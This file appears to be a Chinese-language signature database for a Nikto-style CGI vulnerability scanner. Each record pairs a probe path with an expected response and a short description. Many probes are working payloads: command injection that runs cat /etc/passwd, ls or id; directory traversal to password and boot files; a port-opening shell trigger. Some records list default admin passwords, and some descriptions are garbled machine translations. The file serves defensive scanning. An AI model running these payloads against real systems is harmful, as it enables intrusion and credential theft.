+969#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShtsearch?-c/nonexistant#d9Fa0j#GET#d9Fa0j#Unable to read configuration file '/nonexistant'#d9Fa0j#对ht::/Dig的安装可以让攻击者强行任意读取ht::/Dig的配置文件。#d9Fa0j#
+970#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmkilog.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI给攻击者提供了很多信息。#d9Fa0j#
+971#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmkplog.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI给攻击者提供了很多信息。#d9Fa0j#
+973#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSprocessit.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI返回的环境变量，使攻击者有价值的信息。#d9Fa0j#
+974#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrpm_query#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI允许任何人看到已安装的RPM包。#d9Fa0j#
+975#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3#d9Fa0j#GET#d9Fa0j#Unknown configuration#d9Fa0j#这个Sawmill CGI允许攻击者读取Sawmill的密码。#d9Fa0j#
+978#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSws_ftp.ini#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可以包含FTP站点保存的密码。#d9Fa0j#
+979#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSWS_FTP.ini#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可以包含FTP站点保存的密码。#d9Fa0j#
+1000#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSview-source?view-source#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这允许远程用户查看源代码。#d9Fa0j#
+1001#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebplus?about#d9Fa0j#GET#d9Fa0j#Product Information#d9Fa0j#WEBPLUS可能泄露产品信息，包括版本号。 4.X版本及以下有一个文件读取漏洞。#d9Fa0j#
+1004#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSibill.pm#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#iBill.pm安装。这可能被暴力破解密码。#d9Fa0j#
+1005#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSscoadminreg.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个脚本（UnixWare的网络桌面的部分）可能有一个本地根利用。这也是一个系统管理脚本，应通过网络保护。#d9Fa0j#
+1006#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSSGB_DIR/superguestconfig#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#lasource.r2.ru的Super GuestBook 1.0 将管理员密码存储在纯文本文件中。#d9Fa0j#
+1010#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSicat#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#多个版本的ICAT允许攻击者读取任意文件。确保运行最新版本。#d9Fa0j#
+1016#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#nCUBE Server Manager1.0 NPH- showlogs.pl目录遍历漏洞。#d9Fa0j#
+1017#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSquery?mss=%2e%2e/config#d9Fa0j#GET#d9Fa0j#MGMT_PW#d9Fa0j#该AltaVista搜索服务允许攻击者读取服务器上的任何文件。#d9Fa0j#
+1018#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStest-cgi?/*#d9Fa0j#GET#d9Fa0j#/tmp#d9Fa0j#这个CGI允许文件被远程读取。#d9Fa0j#
+1019#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSupdate.dpgs#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Duma Photo Gallery系统可能允许远程用户写入系统上的任何文件。详见http://b0iler.eyeonsecurity.net。这不能进行远程测试。#d9Fa0j#
+1020#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSview-source#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这可能允许远程检索任意文件。#d9Fa0j#
+1021#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwrap#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI使用户阅读任何文件。它不应该在CGI目录中。#d9Fa0j#
+1023#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#这个CGI允许攻击者读取文件并执行远程命令。#d9Fa0j#
+1024#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlastlines.cgi?process#d9Fa0j#POST#d9Fa0j#root:#d9Fa0j#这可以让攻击者读取任意CGI文件和/或执行命令。#d9Fa0j#
+1025#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScalendar_admin.pl?config=|cat%20/etc/passwd|#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#这个CGI允许攻击者在服务器上执行命令。#d9Fa0j#
+1026#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScalendar/calendar_admin.pl?config=|cat%20/etc/passwd|#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#这个CGI允许攻击者在服务器上执行命令。#d9Fa0j#
+1027#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScampas?%0acat%0a/etc/passwd%0a#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#应用服务中心网络允许攻击者在服务器上执行命令#d9Fa0j#
+1028#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgicso?query=AAA#d9Fa0j#GET#d9Fa0j#400 Required field missing: fingerhost#d9Fa0j#CGIEmail cgicso允许攻击者执行远程命令#d9Fa0j#
+1029#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgiwrap#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#有些版本允许任何人执行远程命令#d9Fa0j#
+1030#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScommon/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|#d9Fa0j#GET#d9Fa0j#resolv.conf#d9Fa0j#允许攻击者执行、升级或删除HTTP后台程序#d9Fa0j#
+1031#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSCount.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能允许攻击者在服务器上执行任意命令#d9Fa0j#
+1032#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScsChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#从CGIscript.net上获知多个脚本具有远程代码执行漏洞，请升级到最新版本#d9Fa0j#
+1033#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScsGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#从CGIscript.net上获知多个脚本具有远程代码执行漏洞，请升级到最新版本#d9Fa0j#
+1034#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScsLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#从CGIscript.net上获知多个脚本具有远程代码执行漏洞，请升级到最新版本#d9Fa0j#
+1035#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScsNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#从CGIscript.net上获知多个脚本具有远程代码执行漏洞，请升级到最新版本#d9Fa0j#
+1036#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSecho.bat#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能允许攻击者CGI执行远程命令#d9Fa0j#
+1037#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSformmail.cgi?recipient=root@localhost%0Acat%20/etc/passwd&email=joeuser@localhost&subject=test#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#服务器允许攻击者通过CGI检索任意文件#d9Fa0j#
+1038#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSImageFolio/admin/admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#图像处理软件ImageFolio(默认管理账户/ImageFolio)允许删除文件比如URL：?cgi=remove.plImageFolio (default accout Admin/ImageFolio) may allow files to be deleted via URLs like: ?cgi=remove.pl&uid=111.111.111.111&rmstep=2&category=../../../../../../../../../../../etc/"uid=111.111.1#d9Fa0j#
+1039#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSinfo2www '(../../../../../../../bin/mail root </etc/passwd>#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#允许攻击者通过CGI执行命令执行密码文件转移到根目录#d9Fa0j#
+1040#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSinfo2www#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#允许攻击者执行CGI命令#d9Fa0j#
+1041#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSinfosrch.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#允许攻击者执行CGI命令#d9Fa0j#
+1042#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlistrec.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#允许攻击者在本机执行CGI命令#d9Fa0j#
+1043#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmailnews.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#有些版本允许攻击者执行、升级或删除HTTP后台程序#d9Fa0j#
+1044#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmmstdod.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能允许攻击者执行远程命令。升级版本3.0.26或更高的版本。#d9Fa0j#
+1045#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpagelog.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#一些版本允许创建文件，可以通过请求 'pagelog.cgi?name=../../../../.././tmp/filename' 进行尝试。#d9Fa0j#
+1046#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSperl?-v#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#perl安装在CGI目录。 这实质上是一个系统给攻击者的图形执行命令界面。请在CGI目录下删除perl#d9Fa0j#
+1047#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSperl.exe?-v#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#perl安装在CGI目录。 这实质上是一个系统给攻击者的图形执行命令界面。请在CGI目录下删除perl#d9Fa0j#
+1048#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSperl.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#perl安装在CGI目录。 这实质上是一个系统给攻击者的图形执行命令界面。请在CGI目录下删除perl#d9Fa0j#
+1049#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSperl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#perl安装在CGI目录。 这实质上是一个系统给攻击者的图形执行命令界面。请在CGI目录下删除perl#d9Fa0j#
+1050#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSplusmail#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能允许攻击者远程通过CGI执行命令#d9Fa0j#
+1051#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSscripts/slxweb.dll/getfile?type=Library&file=[invalid%20filename]#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#SalesLogix WebClient可能允许攻击者在本机执行任何的命令#d9Fa0j#
+1052#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsmartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#检测是否能远程执行漏洞？关键字=|/bin/ls | 或您一些常用的命令#d9Fa0j#
+1053#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsmartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#检测是否能远程执行漏洞？关键字=|/bin/ls | 或您一些常用的命令#d9Fa0j#
+1054#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSspin_client.cgi?aaaaaaaa#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这个CGI可以远程执行 8000 x 'a'的字符（可以查看到500错误信息）#d9Fa0j#
+1055#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsscd_suncourier.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Sunsolve CD脚本允许用户执行任意命令，脚本是存在的，但没有做过测试。#d9Fa0j#
+1056#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSviralator.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能存在命令注入漏洞，升级到0.9per2版本，这个漏洞需要进步一证实#d9Fa0j#
+1057#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSvirgil.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Virgil CGI扫描器0.9版本可以远程获取用户系统权限，可以尝试(try syntax like virgil.cgi?tar=-lpThe Virgil CGI Scanner 0.9 allows remote users to gain a system shell. This could not be confirmed (try syntax like virgil.cgi?tar=-lp&zielport=31337 to open a connection on port 31337.#d9Fa0j#
+1058#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSvpasswd.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#一些版本攻击者可以对现有系统执行CGI命令，严重是否是最新版本。#d9Fa0j#
+1059#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebgais#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#webgais允许攻击者执行命令#d9Fa0j#
+1060#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebsendmail#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能允许攻击者远程执行CGI命令#d9Fa0j#
+1061#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwhois.cgi?action=load&whois=%3Bid#d9Fa0j#GET#d9Fa0j#uid=#d9Fa0j#这个脚本允许远程执行命令#d9Fa0j#
+1062#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwwwwais#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#wwwais漏洞可以让攻击者通过http执行命令，请求'CGIDIR/wwwais?version=version=123wwwais has a vulnerability that lets attackers run commands as http daemon owner. Request 'CGIDIR/wwwais?version=version=123&' and 4096 bytes of garbage."' and 4096可获知。"#d9Fa0j#
+1064#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScommon/listrec.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#允许攻击者本机执行CGI命令#d9Fa0j#
+1073#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstat.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Uninets StatsPlus 1.25 from http://www.uninetsolutions.com/stats.html may be vulnerable to command/script injection by manipulating HTTP_USER_AGENT or HTTP_REFERER.#d9Fa0j#
+1074#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScachemgr.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#RedHat6 管理代理服务器squid，允许攻击者通过端口扫描攻击。#d9Fa0j#
+1075#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSppdscgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#PowerPlay Web Edition可能允许非授权的用户访问页面#d9Fa0j#
+1077#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebif.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#HNS's 2.00版本或0.8更早的webif.cgi文件允许远程用户直接重写。#d9Fa0j#
+1086#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebdriver#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#允许任何人在本机上访问CGI的Informix 数据库。#d9Fa0j#
+1088#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSc32web.exe/ChangeAdminPassword#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这也可能包含一个后门和CGI,攻击者可以允许改变Cart32管理员密码。#d9Fa0j#
+1090#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgi-lib.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#CGI的图书馆。如果收回检查,看看它是否已经过时,它可能漏洞威胁#d9Fa0j#
+1091#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSlog/nether-log.pl?checkit#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#默认密码：nethernet-rules#d9Fa0j#
+1092#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmini_logger.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#默认密码：guest#d9Fa0j#
+1093#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmt-static/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Movable输入博客，包含一些安全问题，数据是弱密码或者更多漏洞。默认登陆账号'Melody'和密码'Nelson'#d9Fa0j#
+1094#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmt/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Movable输入博客，包含一些安全问题，数据是弱密码或者更多漏洞。默认登陆账号'Melody'和密码'Nelson'#d9Fa0j#
+1095#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnimages.php#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Alpha版本的Nimages容易非特殊包装的主要的安全问题。#d9Fa0j#
+1096#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrobadmin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#默认密码：roblog#d9Fa0j#
+1098#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnetpad.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#netpad.cgi可能显示有一个恶意用户对系统,因为它允许网络访问文件系统。它也可能有远程漏洞本身。这应该是删除或保护。#d9Fa0j#
+1099#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStroops.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这可能是一个剩下CGI从入侵网站;可以用来尝试黑客另外的地点。应进一步研究。#d9Fa0j#
+1100#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSunlg1.1#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#网站系统通用逻辑后门#d9Fa0j#
+1101#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSunlg1.2#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#网站系统通用逻辑后门#d9Fa0j#
+1102#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrwwwshell.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#THC反向网站后门#d9Fa0j#
+1103#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSphoto/manage.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#My Photo Gallery管理界面，可以允许全部相片查看和更多。#d9Fa0j#
+1204#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSblog/mt-check.cgi#d9Fa0j#GET#d9Fa0j#Current working directory#d9Fa0j#Movable Type weblog诊断脚本发现，泄露了docroot路径,操作系统,perl版本,模块信息#d9Fa0j#
+1355#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSccbill-local.pl?cmd=MENU#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能有漏洞，查看网页日志发现未知扫描器#d9Fa0j#
+1356#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSccbill-local.cgi?cmd=MENU#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能有漏洞，查看网页日志发现未知扫描器#d9Fa0j#
+1357#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmastergate/search.cgi?search=0&search_on=all#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能有漏洞，查看网页日志发现未知扫描器#d9Fa0j#
+1358#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSBackup/add-passwd.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能有漏洞，查看网页日志发现未知扫描器#d9Fa0j#
+1359#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsendpage.pl?message=test\;/bin/ls%20/etc;echo%20\message#d9Fa0j#GET#d9Fa0j#passwd#d9Fa0j#sendpage.pl可通过变量信息执行命令#d9Fa0j#
+1360#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgbook/gbook.cgi?_MAILTO=xx;ls#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#gbook.cgi允许命令执行。#d9Fa0j#
+1361#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbslist.cgi?email=x;ls#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#BSList允许命令执行。#d9Fa0j#
+1362#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbsguest.cgi?email=x;ls#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#BSList允许命令执行。#d9Fa0j#
+1363#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnbmember.cgi?cmd=list_all_users#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Netbilling ndmember.cgi泄露敏感信息。#d9Fa0j#
+1367#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwhere.pl?sd=ls%20/etc#d9Fa0j#GET#d9Fa0j#passwd#d9Fa0j#可能有漏洞，查看网页日志发现未知扫描器#d9Fa0j#
+1392#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSphf?Qname=root%0Acat%20/etc/passwd%20#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#可能允许攻击者读取任意系统文件和执行命令#d9Fa0j#
+1393#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSphf.cgi?QALIAS=x%0a/bin/cat%20/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#可能允许攻击者读取任意系统文件和执行命令#d9Fa0j#
+1394#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSphf#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可能允许攻击者读取任意系统文件和执行命令#d9Fa0j#
+1395#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSupload.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#upload.cgi允许攻击者的任意文件上传到服务器。#d9Fa0j#
+1402#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnph-publish.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#CGI可能允许攻击者在服务器上执行任意的命令。 #d9Fa0j#
+1403#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnph-test-cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#CGI让攻击者获得一个目录上的CGI目录。  #d9Fa0j#
+1405#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpfdispaly.cgi?'%0A/bin/cat%20/etc/passwd|'#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#允许攻击者本机执行任意命令#d9Fa0j#
+1406#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpfdispaly.cgi?../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#允许攻击者本机读取任意文件#d9Fa0j#
+1407#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpfdisplay.cgi?'%0A/bin/cat%20/etc/passwd|'#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#允许攻击者本机执行任意命令#d9Fa0j#
+1410#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebcart/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;cat%20/etc/passwd|&CODE=PHOLD#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#webcart.cgi允许远程命令执行。 升级到最新版本。#d9Fa0j#
+1454#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSphoto/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#我的图库按3.6含有多个漏洞包括目录遍历,未指明的漏洞,和远程管理接口访问。 #d9Fa0j#
+1470#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmusicqueue.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Musicqueue 1.20是很容易受到缓冲溢出。 确保安装最新的版本(不开发)。http://musicqueue.sourceforge.net/#d9Fa0j#
+1473#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwindmail#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#一些版本非常脆弱。请求的windmail吗?可能boot.ini % 20 c:\ % 20 you@youraddress.com”(更换你的地址),看看你得到boot.ini文件#d9Fa0j#
+1474#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwindmail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#一些版本非常脆弱。请求的windmail吗?可能boot.ini % 20 c:\ % 20 you@youraddress.com”(更换你的地址),看看你得到boot.ini文件#d9Fa0j#
+1475#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSWINDMAIL.EXE?%20-n%20c:\boot.ini%#d9Fa0j#GET#d9Fa0j#boot loader#d9Fa0j#WINDMAIL.EXE可以读取任意文件#d9Fa0j#
+1476#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSWINDMAIL.EXE?%20-n%20c:\boot.ini%20Hacker@hax0r.com%20|%20dir%20c:\\#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#WINDMAIL.EXE可以读取任意文件#d9Fa0j#
+1479#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdose.pl?daily&somefile.txt&|ls|#d9Fa0j#GET#d9Fa0j#somefile.txt#d9Fa0j#DailyDose 1.1是很容易受到攻击的目录遍历列表的参数。#d9Fa0j#
+1488#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgbadmin.cgi?action=change_adminpass#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#RNN 留言板 1.2版本含有多个漏洞，包括：远程管理员密码，删除帖子，改变设置，远程执行命令和更多。默认管理员密码不是‘admin’就是‘demo’#d9Fa0j#
+1489#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgbadmin.cgi?action=change_automail#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#RNN 留言板 1.2版本含有多个漏洞，包括：远程管理员密码，删除帖子，改变设置，远程执行命令和更多。默认管理员密码不是‘admin’就是‘demo’#d9Fa0j#
+1490#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgbadmin.cgi?action=colors#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#RNN 留言板 1.2版本含有多个漏洞，包括：远程管理员密码，删除帖子，改变设置，远程执行命令和更多。默认管理员密码不是‘admin’就是‘demo’#d9Fa0j#
